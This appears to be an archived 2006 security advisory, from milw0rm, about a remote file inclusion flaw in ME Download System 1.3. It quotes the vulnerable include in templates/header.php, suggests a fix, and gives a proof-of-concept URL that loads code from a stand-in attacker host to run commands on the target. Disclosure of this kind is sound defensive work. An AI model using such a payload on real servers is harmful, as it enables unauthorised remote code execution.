@@ -1,0 +1,54 @@
++--------------------------------------------------------------------
++
++ ME Download System 1.3 Remote File Inclusion
++
++--------------------------------------------------------------------
++
++ Affected Software .: ME Download System 1.3
++ Venedor ...........: http://www.ehmig.net/
++ Class .............: Remote File Inclusion
++ Risk ..............: high (Remote File Execution)
++ Found by ..........: Philipp Niedziela
++ Original advisory .: http://www.bb-pcsecurity.de/sicherheit_282.htm
++ Contact ...........: webmaster[at]bb-pcsecurity[.]de
++ Affected Files ....: templates/header.php
++
++--------------------------------------------------------------------
++
++ Code of /templates/header.php:
++
++ .....
++ <?php
++ include($Vb8878b936c2bd8ae0cab.'/settings_style.php');
++ .....
++
++--------------------------------------------------------------------
++
++ $Vb8878b936c2bd8ae0cab is not properly sanitized before being used
++
++--------------------------------------------------------------------
++
++ Solution:
++ Include config-File in header.php:
++
++--------------------------------------------------------------------
++
++ PoC:
++ http://[target]/templates/header.php?$Vb8878b936c2bd8ae0cab=http://evilsite.com?cmd=ls
++
++--------------------------------------------------------------------
++
++ Notice:
++ Maybe there are more RFI-Vulns in other files, but it's very hard
++ to read this code.
++
++ Venedor has been contacted, but I didn't received any answer.
++
++--------------------------------------------------------------------
++
++ Greets:
++ Krini Gonzales
++
++-------------------------[ E O F ]----------------------------------
+
+# milw0rm.com [2006-08-07]
